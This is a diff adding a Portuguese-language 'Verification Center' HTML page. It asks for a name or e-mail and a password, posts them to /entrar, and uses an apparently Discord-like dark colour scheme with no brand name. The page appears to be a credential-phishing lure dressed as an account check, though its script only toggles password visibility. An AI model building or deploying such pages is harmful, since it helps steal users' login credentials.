@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Central de Verificação</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial, sans-serif;
+}
+
+body{
+    background:#313338;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+}
+
+.box{
+    background:#1e1f22;
+    width:400px;
+    padding:35px;
+    border-radius:10px;
+    color:white;
+    box-shadow:0 0 20px rgba(0,0,0,0.3);
+}
+
+.logo{
+    text-align:center;
+    font-size:55px;
+    margin-bottom:10px;
+}
+
+h2{
+    text-align:center;
+    margin-bottom:10px;
+}
+
+.subtitulo{
+    text-align:center;
+    color:#b5bac1;
+    margin-bottom:20px;
+    font-size:14px;
+}
+
+input[type="text"],
+input[type="password"]{
+    width:100%;
+    padding:12px;
+    margin-top:10px;
+    background:#111214;
+    border:1px solid #2b2d31;
+    border-radius:5px;
+    color:white;
+}
+
+input[type="text"]:focus,
+input[type="password"]:focus{
+    outline:none;
+    border-color:#5865F2;
+}
+
+.mostrar{
+    margin-top:12px;
+    color:#b5bac1;
+    font-size:14px;
+}
+
+button{
+    width:100%;
+    padding:12px;
+    margin-top:20px;
+    background:#5865F2;
+    color:white;
+    border:none;
+    border-radius:5px;
+    font-weight:bold;
+    cursor:pointer;
+}
+
+button:hover{
+    background:#4752c4;
+}
+</style>
+</head>
+
+<body>
+
+<div class="box">
+
+    <div class="logo">🛡️</div>
+
+    <h2>Central de Verificação</h2>
+
+    <p class="subtitulo">
+        Realize sua verificação para continuar
+    </p>
+
+    <form action="/entrar" method="POST">
+
+        <input
+        type="text"
+        name="email"
+        placeholder="Nome ou E-mail"
+        required>
+
+        <input
+        type="password"
+        id="senha"
+        name="senha"
+        placeholder="Senha"
+        required>
+
+        <div class="mostrar">
+            <input type="checkbox" onclick="mostrarSenha()">
+            Mostrar senha
+        </div>
+
+        <button type="submit">
+            Entrar
+        </button>
+
+    </form>
+
+</div>
+
+<script>
+function mostrarSenha() {
+    var senha = document.getElementById("senha");
+
+    if (senha.type === "password") {
+        senha.type = "text";
+    } else {
+        senha.type = "password";
+    }
+}
+</script>
+
+</body>
+</html>
